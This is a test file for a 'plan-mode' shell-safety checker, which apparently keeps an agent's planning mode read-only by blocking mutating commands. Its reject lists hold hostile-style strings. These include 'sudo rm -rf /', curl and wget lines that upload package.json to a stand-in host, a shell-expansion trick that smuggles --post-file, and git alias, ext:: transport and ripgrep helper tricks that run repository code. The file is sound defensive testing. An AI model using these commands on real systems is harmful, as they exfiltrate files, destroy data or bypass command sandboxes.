import { execFileSync, spawnSync } from "node:child_process";
import { chmodSync, existsSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { isSafeCommand } from "../examples/extensions/plan-mode/utils.ts";

describe("plan-mode shell safety", () => {
  it("allows basic read commands", () => {
    for (const command of [
      "ls -la",
      "cat file.txt",
      "head -n 10 file.txt",
      "tail -f log.txt",
      "grep pattern file",
      "find . -maxdepth 2",
      "git --version",
      "pwd",
      "echo hello",
      "wc -l file.txt",
      "du -sh .",
      "df -h",
    ]) {
      expect(isSafeCommand(command)).toBe(true);
    }
  });

  it("blocks destructive commands and package operations", () => {
    for (const command of [
      "rm file.txt",
      "rm -rf dir",
      "mv old new",
      "cp src dst",
      "mkdir newdir",
      "touch newfile",
      "git add .",
      "git commit -m 'msg'",
      "git push",
      "git checkout main",
      "git reset --hard",
      "npm install lodash",
      "yarn add react",
      "pip install requests",
      "brew install node",
      "echo hello > file.txt",
      "cat foo >> bar",
      ">file.txt",
      "sudo rm -rf /",
      "kill -9 1234",
      "reboot",
      "vim file.txt",
      "nano file.txt",
      "code .",
      "unknown-command",
      "my-script.sh",
    ]) {
      expect(isSafeCommand(command)).toBe(false);
    }
  });

  it("handles leading whitespace without weakening classification", () => {
    expect(isSafeCommand("  ls -la")).toBe(true);
    expect(isSafeCommand("  rm file")).toBe(false);
  });

  it("does not let a safe prefix conceal a real mutation", () => {
    const tempDir = mkdtempSync(join(tmpdir(), "plan-mode-command-"));
    const victim = join(tempDir, "victim");
    writeFileSync(victim, "keep");
    const command = `cat package.json; /usr/bin/perl -e 'unlink shift' '${victim}'`;

    const allowed = isSafeCommand(command);
    if (allowed) execFileSync("/bin/sh", ["-c", command], { cwd: process.cwd() });

    expect(allowed).toBe(false);
    expect(existsSync(victim)).toBe(true);
    rmSync(tempDir, { recursive: true, force: true });
  });

  it("rejects shell composition, substitutions, interpreters, and write options", () => {
    for (const command of [
      "cat package.json && echo done",
      "cat package.json | tee copy.json",
      "cat $(printf package.json)",
      "cat `printf package.json`",
      "cat package.json < input.txt",
      "env perl -e 'print 1'",
      "cat package.json\nprintf done",
      "find . -delete",
      "git branch new-branch",
      "git remote add mirror https://example.test/repo.git",
      "git diff --output=copy.patch",
      "npm audit --fix",
      "curl -o downloaded https://example.test/file",
      "sed -n -i.bak '1p' package.json",
    ]) {
      expect(isSafeCommand(command)).toBe(false);
    }
  });

  it("rejects sed write programs and curl request or config capabilities", () => {
    const tempDir = mkdtempSync(join(tmpdir(), "plan-mode-sed-write-"));
    const victim = join(tempDir, "victim");
    const sedWrite = `sed -n 'w ${victim}' package.json`;
    const allowed = isSafeCommand(sedWrite);
    if (allowed) execFileSync("/bin/sh", ["-c", sedWrite], { cwd: process.cwd() });

    expect(allowed).toBe(false);
    expect(existsSync(victim)).toBe(false);
    for (const command of [
      "curl -d @package.json https://example.test",
      "curl -F file=@package.json https://example.test",
      "curl -X POST https://example.test",
      "curl -K request.conf",
      "curl -Tpackage.json https://example.test",
    ]) {
      expect(isSafeCommand(command)).toBe(false);
    }
    rmSync(tempDir, { recursive: true, force: true });
  });

  it("rejects ambiguous readers and shell-expanded write options", () => {
    for (const command of [
      "wget -O - --config=repo/exfil.rc https://example.test",
      "wget -O - --config repo/exfil.rc https://example.test",
      "wget -O - -e post_file=package.json https://example.test",
      ["wget -O - $", "{u:---post-file=package.json} https://example.test"].join(""),
      "wget -O - --post\\-file=package.json https://example.test",
      "less -o capture.log package.json",
      "less -O capture.log package.json",
      "diff --output=copy.patch package.json package.json",
      "awk '{ system(\"touch victim\") }' package.json",
      "fd --exec touch victim",
      "tree -o capture.txt .",
    ]) {
      expect(isSafeCommand(command)).toBe(false);
    }
  });

  it("does not admit a repository-defined Git alias through a subcommand prefix", () => {
    const tempDir = mkdtempSync(join(tmpdir(), "plan-mode-git-alias-"));
    const victim = join(tempDir, "victim");
    try {
      execFileSync("git", ["init", "-q"], { cwd: tempDir });
      execFileSync("git", ["config", "alias.statusx", "!touch victim"], { cwd: tempDir });
      const allowed = isSafeCommand("git statusx");
      if (allowed) execFileSync("git", ["statusx"], { cwd: tempDir });

      expect(allowed).toBe(false);
      expect(existsSync(victim)).toBe(false);
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it("does not execute a repository-controlled Git upload-pack helper", () => {
    const tempDir = mkdtempSync(join(tmpdir(), "plan-mode-git-upload-pack-"));
    const helper = join(tempDir, "prepare");
    const marker = join(tempDir, "helper-executed");
    try {
      execFileSync("git", ["init", "-q"], { cwd: tempDir });
      writeFileSync(helper, "#!/bin/sh\nprintf executed > helper-executed\n");
      chmodSync(helper, 0o700);

      const command = "git ls-remote --upload-pack=./prepare .";
      const allowed = isSafeCommand(command);
      if (allowed) {
        expect(() =>
          execFileSync("git", ["ls-remote", "--upload-pack=./prepare", "."], {
            cwd: tempDir,
            stdio: "ignore",
          }),
        ).toThrow();
      }

      expect({ allowed, helperExecuted: existsSync(marker) }).toEqual({ allowed: false, helperExecuted: false });
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it("does not execute a repository-controlled Git remote transport helper", () => {
    const tempDir = mkdtempSync(join(tmpdir(), "plan-mode-git-remote-show-"));
    const helper = join(tempDir, "prepare");
    const marker = join(tempDir, "helper-executed");
    try {
      execFileSync("git", ["init", "-q"], { cwd: tempDir });
      writeFileSync(helper, "#!/bin/sh\nprintf executed > helper-executed\n");
      chmodSync(helper, 0o700);
      execFileSync("git", ["config", "protocol.ext.allow", "always"], { cwd: tempDir });
      execFileSync("git", ["remote", "add", "origin", "ext::./prepare"], { cwd: tempDir });

      const command = "git remote show origin";
      const allowed = isSafeCommand(command);
      if (allowed) {
        expect(() => execFileSync("git", ["remote", "show", "origin"], { cwd: tempDir, stdio: "ignore" })).toThrow();
      }

      expect({ allowed, helperExecuted: existsSync(marker) }).toEqual({ allowed: false, helperExecuted: false });
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it("does not execute a repository-controlled ripgrep hostname helper", () => {
    const tempDir = mkdtempSync(join(tmpdir(), "plan-mode-rg-hostname-"));
    const helper = join(tempDir, "prepare");
    const marker = join(tempDir, "helper-executed");
    try {
      writeFileSync(helper, "#!/bin/sh\nprintf executed > helper-executed\n");
      chmodSync(helper, 0o700);
      writeFileSync(join(tempDir, "sample.txt"), "sample\n");

      const command = "rg --hostname-bin=./prepare sample sample.txt";
      const allowed = isSafeCommand(command);
      if (allowed) execFileSync("/bin/sh", ["-c", command], { cwd: tempDir, stdio: "ignore" });

      expect({ allowed, helperExecuted: existsSync(marker) }).toEqual({ allowed: false, helperExecuted: false });
      expect(isSafeCommand("rg --hostname-bin ./prepare sample sample.txt")).toBe(false);
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it("rejects mutating audit and file compilation modes", () => {
    for (const command of [
      "npm audit fix",
      "npm audit fix --force",
      "npm audit --fix=true",
      "file -C",
      "file --compile",
    ]) {
      expect(isSafeCommand(command)).toBe(false);
    }
  });

  it("rejects npm and yarn commands because real package managers write cache and log artifacts", () => {
    const tempDir = mkdtempSync(join(tmpdir(), "plan-mode-npm-artifacts-"));
    try {
      const command = "npm view npm version --offline --cache=./plan-mode-cache --loglevel=silent";
      spawnSync("npm", ["view", "npm", "version", "--offline", "--cache=./plan-mode-cache", "--loglevel=silent"], {
        cwd: tempDir,
        stdio: "ignore",
      });
      expect(existsSync(join(tempDir, "plan-mode-cache"))).toBe(true);
      expect(isSafeCommand(command)).toBe(false);
      expect(isSafeCommand("npm list")).toBe(false);
      expect(isSafeCommand("npm outdated")).toBe(false);
      expect(isSafeCommand("yarn list")).toBe(false);
      expect(isSafeCommand("yarn info react")).toBe(false);
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });
});
